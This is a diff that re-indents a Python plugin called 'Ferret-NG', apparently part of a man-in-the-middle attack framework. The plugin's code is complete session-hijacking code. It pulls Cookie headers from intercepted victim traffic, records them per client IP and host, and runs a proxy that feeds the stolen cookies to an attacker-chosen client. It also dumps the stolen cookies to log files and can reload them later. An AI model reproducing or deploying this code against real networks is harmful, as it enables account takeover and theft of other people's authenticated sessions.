@@ -26,75 +26,75 @@ from twisted.web import http
 from twisted.internet import reactor
 
 class FerretNG(Plugin):
-	name        = "Ferret-NG"
-	optname     = "ferretng"
-	desc        = "Captures cookies and starts a proxy that will feed them to connected clients"
-	version     = "0.1"
-	has_opts    = True
+    name        = "Ferret-NG"
+    optname     = "ferretng"
+    desc        = "Captures cookies and starts a proxy that will feed them to connected clients"
+    version     = "0.1"
+    has_opts    = True
 
-	def initialize(self, options):
-		self.options = options
-		self.ferret_port = options.ferret_port
-		self.cookie_file = None
+    def initialize(self, options):
+        self.options = options
+        self.ferret_port = options.ferret_port
+        self.cookie_file = None
 
-		from core.ferretng.FerretProxy import FerretProxy
-		from core.ferretng.URLMonitor import URLMonitor
+        from core.ferretng.FerretProxy import FerretProxy
+        from core.ferretng.URLMonitor import URLMonitor
 
-		URLMonitor.getInstance().hijack_client = self.config['Ferret-NG']['Client']
+        URLMonitor.getInstance().hijack_client = self.config['Ferret-NG']['Client']
 
-		from core.utils import shutdown
-		if options.cookie_file:
-			self.tree_info.append('Loading cookies from log file')
-			try:
-				with open(options.cookie_file, 'r') as cookie_file:
-					self.cookie_file = json.dumps(cookie_file.read())
-					URLMonitor.getInstance().cookies = self.cookie_file
-					cookie_file.close()
-			except Exception as e:
-				shutdown("[-] Error loading cookie log file: {}".format(e))
+        from core.utils import shutdown
+        if options.cookie_file:
+            self.tree_info.append('Loading cookies from log file')
+            try:
+                with open(options.cookie_file, 'r') as cookie_file:
+                    self.cookie_file = json.dumps(cookie_file.read())
+                    URLMonitor.getInstance().cookies = self.cookie_file
+                    cookie_file.close()
+            except Exception as e:
+                shutdown("[-] Error loading cookie log file: {}".format(e))
 
-		self.tree_info.append("Listening on port {}".format(self.ferret_port))
+        self.tree_info.append("Listening on port {}".format(self.ferret_port))
 
-	def on_config_change(self):
-		self.log.info("Will now hijack captured sessions from {}".format(self.config['Ferret-NG']['Client']))
-		URLMonitor.getInstance().hijack_client = self.config['Ferret-NG']['Client']
+    def on_config_change(self):
+        self.log.info("Will now hijack captured sessions from {}".format(self.config['Ferret-NG']['Client']))
+        URLMonitor.getInstance().hijack_client = self.config['Ferret-NG']['Client']
 
-	def request(self, request):
-		if 'cookie' in request.headers:
-			host   = request.headers['host']
-			cookie = request.headers['cookie']
-			client = request.client.getClientIP()
+    def request(self, request):
+        if 'cookie' in request.headers:
+            host   = request.headers['host']
+            cookie = request.headers['cookie']
+            client = request.client.getClientIP()
 
-			if client not in URLMonitor.getInstance().cookies:
-				URLMonitor.getInstance().cookies[client] = []
+            if client not in URLMonitor.getInstance().cookies:
+                URLMonitor.getInstance().cookies[client] = []
 
-			for entry in URLMonitor.getInstance().cookies[client]:
-				if host == entry['host']:
-					self.clientlog.debug("Updating captured session for {}".format(host), extra=request.clientInfo)
-					entry['host']   = host
-					entry['cookie'] = cookie
-					return
+            for entry in URLMonitor.getInstance().cookies[client]:
+                if host == entry['host']:
+                    self.clientlog.debug("Updating captured session for {}".format(host), extra=request.clientInfo)
+                    entry['host']   = host
+                    entry['cookie'] = cookie
+                    return
 
-			self.clientlog.info("Host: {} Captured cookie: {}".format(host, cookie), extra=request.clientInfo)
-			URLMonitor.getInstance().cookies[client].append({'host': host, 'cookie': cookie})
+            self.clientlog.info("Host: {} Captured cookie: {}".format(host, cookie), extra=request.clientInfo)
+            URLMonitor.getInstance().cookies[client].append({'host': host, 'cookie': cookie})
 
-	def reactor(self, StrippingProxy):
-		FerretFactory = http.HTTPFactory(timeout=10)
-		FerretFactory.protocol = FerretProxy
-		reactor.listenTCP(self.ferret_port, FerretFactory)
+    def reactor(self, StrippingProxy):
+        FerretFactory = http.HTTPFactory(timeout=10)
+        FerretFactory.protocol = FerretProxy
+        reactor.listenTCP(self.ferret_port, FerretFactory)
 
-	def options(self, options):
-		options.add_argument('--port', dest='ferret_port', metavar='PORT', default=10010, type=int, help='Port to start Ferret-NG proxy on (default 10010)')
-		options.add_argument('--load-cookies', dest='cookie_file', metavar='FILE', type=str, help='Load cookies from a log file')
+    def options(self, options):
+        options.add_argument('--port', dest='ferret_port', metavar='PORT', default=10010, type=int, help='Port to start Ferret-NG proxy on (default 10010)')
+        options.add_argument('--load-cookies', dest='cookie_file', metavar='FILE', type=str, help='Load cookies from a log file')
 
-	def on_shutdown(self):
-		if not URLMonitor.getInstance().cookies:
-			return 
+    def on_shutdown(self):
+        if not URLMonitor.getInstance().cookies:
+            return 
 
-		if self.cookie_file == URLMonitor.getInstance().cookies:
-			return
-		
-		self.log.info("Writing cookies to log file")
-		with open('./logs/ferret-ng/cookies-{}.log'.format(datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s")), 'w') as cookie_file:
-			cookie_file.write(str(URLMonitor.getInstance().cookies))
-			cookie_file.close()
+        if self.cookie_file == URLMonitor.getInstance().cookies:
+            return
+        
+        self.log.info("Writing cookies to log file")
+        with open('./logs/ferret-ng/cookies-{}.log'.format(datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s")), 'w') as cookie_file:
+            cookie_file.write(str(URLMonitor.getInstance().cookies))
+            cookie_file.close()
